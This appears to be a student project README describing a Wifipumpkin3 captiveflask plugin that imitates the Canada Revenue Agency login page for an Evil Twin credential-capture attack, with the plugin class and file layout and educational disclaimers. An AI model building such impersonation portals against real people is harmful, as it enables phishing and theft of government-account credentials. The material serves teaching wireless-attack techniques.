# COMP630-FINAL-CAPTIVEFLASK
Developing a captive portal for Wifipumpkin's captiveflask plugin
 
## Description
Developing a custom captiveflask plugin to perform an Evil Twin credential capture. This project recreates a simplified version of the Canada Revenue Agency (CRA) login portal for educational purposes. It's designed to demonstrate the creation of captive portals and should **not** be used for malicious activities. This is purely for learning and understanding the techniques involved.

## Key Resources
A few very helpful resources that were used to create this template:
https://github.com/mh4x0f/extra-captiveflask

https://wifipumpkin3.github.io/2022/captiveflask-portal-build/

## Creating the Captive Portal

The project started by identifying a target login portal (CRA) and saving its HTML source code. The HTML was then significantly simplified, retaining only the core login functionality and essential visual elements. This simplified version focuses solely on the functional aspects of the login process, removing unnecessary elements from the original CRA website. This simulates a CRA login page. Upon submission of login credentials the user is redirected to a "login successful" page, while their credentials are captured to Wifipumpkin. This response could be a  No actual authentication with the CRA system occurs.

### Configuration File

```
# file => craplugin.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class craplugin(CaptiveTemplatePlugin):
    Name = "craplugin"
    Version = "1.0"
    Description = "CRA Login Page'"
    Author = "Sam Bronson"
    TemplatePath = C.TEMPLATES_FLASK + "templates/exampleplugin"
    StaticPath = C.TEMPLATES_FLASK + "templates/exampleplugin/static"
    Preview = C.TEMPLATES_FLASK + "templates/exampleplugin/preview.png"
```

### File Architecture
```
craplugin/
├── static
│   ├── css 
│   │   ├── apps.css
│   │   ├── common.css
│   │   └── theme.min.css
│   └── images
│       ├── sig-blk-en.svg
│       └── wmms-blk.svg
└── templates
    ├── login.html
    └── login_successful.html
```

# Disclaimer
Any malicious use of the contents from this repository, will not hold the author responsible, the contents are solely for educational purpose.

Usage of this template for attacking without prior mutual consistency can be considered as an illegal activity.
Authors assume no liability and are not responsible for any misuse or damage caused by this program.
